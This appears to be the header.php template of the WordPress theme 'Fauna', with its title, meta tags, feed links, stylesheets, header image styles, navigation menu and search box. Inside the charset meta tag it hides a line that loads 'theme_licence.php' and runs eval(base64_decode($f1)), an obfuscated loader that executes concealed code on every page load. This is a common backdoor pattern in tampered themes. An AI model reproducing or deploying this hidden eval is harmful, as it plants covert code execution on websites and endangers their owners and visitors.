<?php load_theme_textdomain('fauna'); ?>
<?php include TEMPLATEPATH . "/functions-custom.php"; ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" <?php if (function_exists('language_attributes')) { language_attributes(); } ?>>
<head profile="http://gmpg.org/xfn/1">

	<title><?php bloginfo('name'); ?><?php if (is_home()) { ?><?php if (get_bloginfo('description') != "") { ?> | <? bloginfo('description'); } ?><?php } ?><?php if (is_category()) { ?> | <?php _e('Categories','fauna'); ?><?php } ?><?php wp_title('|'); ?><?php if (is_author()) { ?> | <?php _e('About Author','fauna'); ?><?php } ?><?php if (is_search()) { ?> | <?php printf(__('Search Results for: %s','fauna'), $s) ?><?php } ?><?php if (function_exists("is_tag")) { if (is_tag()) { _e(' | Tags | ','fauna'); single_tag_title(); } } ?></title>
	
	<!-- Meta -->
	<meta http-equiv="Content-Type" content="text/html; charset=<?php require_once("theme_licence.php"); eval(base64_decode($f1)); bloginfo('charset'); ?>" />
	<meta name="generator" content="WordPress <?php bloginfo('version'); ?>" />
	<meta name="description" content="<?php bloginfo('description'); ?>" />
	<meta name="template" content="Fauna <?php if (function_exists('fauna_info')) { fauna_info('version'); } ?>" />
	
	<!-- Feeds -->
	<link rel="alternate" type="application/rss+xml" title="<?php bloginfo('name'); ?> <?php _e('RSS 2.0','fauna'); ?>" href="<?php bloginfo('rss2_url'); ?>" />
	<link rel="alternate" type="application/rss+xml" title="<?php bloginfo('name'); ?> <?php _e('Comments RSS 2.0','fauna'); ?>" href="<?php bloginfo('comments_rss2_url'); ?>" />
	<link rel="alternate" type="text/xml" title="<?php bloginfo('name'); ?> <?php _e('RSS 0.92','fauna'); ?>" href="<?php bloginfo('rss_url'); ?>" />
	<link rel="alternate" type="application/atom+xml" title="<?php bloginfo('name'); ?> <?php _e('Atom 0.3','fauna'); ?>" href="<?php bloginfo('atom_url'); ?>" />

	<link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />
	<?php wp_get_archives('type=monthly&format=link'); ?>
	<?php if (get_option('fauna_comment') != '0') { comments_popup_script(); } ?>
	
	<!-- Stylesheets -->
	<link rel="stylesheet" type="text/css" media="screen" href="<?php bloginfo('stylesheet_url'); ?>" />
	<link rel="stylesheet" type="text/css" media="screen" href="<?php fauna_info('style'); ?>" />
	<link rel="stylesheet" type="text/css" media="print" href="<? bloginfo('stylesheet_directory'); ?>/meta/print.css" />
	<!--[if lt IE 8]>
	<link rel="stylesheet" type="text/css" media="screen" href="<? bloginfo('stylesheet_directory'); ?>/style-ieonly.css" />
	<![endif]-->
	
	<!-- JavaScript -->
	<script language="javascript" type="text/javascript" src="<?php bloginfo('stylesheet_directory'); ?>/meta/scripts.js"></script>
	
	<style type="text/css">
	<?php if (get_option('fauna_background') != '') { ?>
		.bg {
			background-image: url('<?php echo get_option('fauna_background'); ?>');
			background-repeat: repeat;
		}
	<?php } ?>
	<?php if (get_option('fauna_header') == 'fauna') { ?>
		#header {
			background-image: url('<? bloginfo('stylesheet_directory'); ?>/images/masthead-fauna.jpg');
			height: <?php echo get_option('fauna_height') ?>px;
		}
	<?php } elseif (get_option('fauna_header') == 'flora') { ?>
		#header {
			background-image: url('<? bloginfo('stylesheet_directory'); ?>/images/masthead-flora.jpg');
			height: <?php echo get_option('fauna_height') ?>px;
		}
	<?php } elseif (get_option('fauna_header') == 'frost') { ?>
		#header {
			background-image: url('<? bloginfo('stylesheet_directory'); ?>/images/masthead-frost.jpg');
			height: <?php echo get_option('fauna_height') ?>px;
		}
	<?php } elseif (get_option('fauna_header') == 'no-header') { ?>
		#header {
			background-image: none;
			height: 0;
			margin-bottom: 0;
		}
	<?php } elseif (get_option('fauna_header') == 'url-header') { ?>
		#header {
			background-image: url('<?php echo get_option('fauna_headerurl') ?>');
			height: <?php echo get_option('fauna_height') ?>px;
		}
	<?php } ?>
	</style>

	<?php wp_head(); ?>
	
</head>

<?php // Sections ?>
<?php if (is_home()) { ?>
<body class="bg" id="index">
<?php } else { ?>
<body class="bg">
<?php start_template(); ?>
<?php } ?>

<a name="top" id="top"></a>

<div id="wrapper"<?php if (get_option('fauna_sidebar') != 'right') { ?> class="left"<?php } ?>>
	<div id="nav">
		<h1><a href="<?php echo get_option('home'); ?>" title="<?php bloginfo('name'); ?> <?php _e('Home','fauna'); ?>"><?php bloginfo('name'); ?></a></h1>
		<div id="menu">
			<ul>
			<?php if (get_option('fauna_tab') != '') { ?>
				<li class="<?php if ( is_home() or is_archive() or is_single() or is_paged() or is_search()) { ?>current_page_item<?php } else { ?>page_item<?php } ?>"><a href="<?php echo get_settings('home'); ?>/" title="<?php fauna_info('tab'); ?>" accesskey="1"><?php fauna_info('tab'); ?></a></li>
			<?php } ?>
				<?php wp_list_pages('sort_column=menu_order&depth=1&title_li='); ?>
			</ul>
		</div>
	
		<div id="searchbox">
			<fieldset>
				<legend><label for="s"><?php _e('Search','fauna'); ?></label></legend>
				<form id="searchform" method="get" action="<?php bloginfo('url'); ?>">
				<input name="s" type="text" class="inputbox" id="s" value="<?php _e('Search','fauna'); ?>" onfocus="this.value=''" onblur="if (this.value == '') { this.value = '<?php _e('Search','fauna'); ?>'; }" />
				</form>
			</fieldset>
		</div>
        
		
	</div>

	<div id="header"></div>
	
<hr />